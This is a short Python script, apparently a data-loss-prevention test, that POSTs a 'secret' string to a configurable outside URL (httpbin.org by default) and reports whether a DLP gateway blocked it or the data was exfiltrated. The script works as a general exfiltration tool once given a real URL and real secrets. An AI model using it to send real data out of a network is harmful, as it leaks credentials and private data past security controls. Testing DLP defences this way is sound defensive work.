import argparse

import requests

DEFAULT_URL = "https://httpbin.org/post"


def send_payload(url: str, secret: str) -> None:
    print(f"[*] Posting to {url}...")
    try:
        resp = requests.post(url, data={"data": secret}, timeout=5)
        if resp.status_code == 403:
            print("[!] Blocked by DLP Gateway (403 Forbidden).")
        elif resp.status_code == 200:
            print("[+] Success: Exfiltrated to external server (200 OK).")
        else:
            print(f"[?] Server returned HTTP {resp.status_code}")
    except Exception as err:
        print(f"[-] Request failed: {err}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default=DEFAULT_URL, help="Target URL")
    parser.add_argument(
        "--secret", default="Sample data containing a SECRET token", help="Payload"
    )
    args = parser.parse_args()

    send_payload(args.url, args.secret)
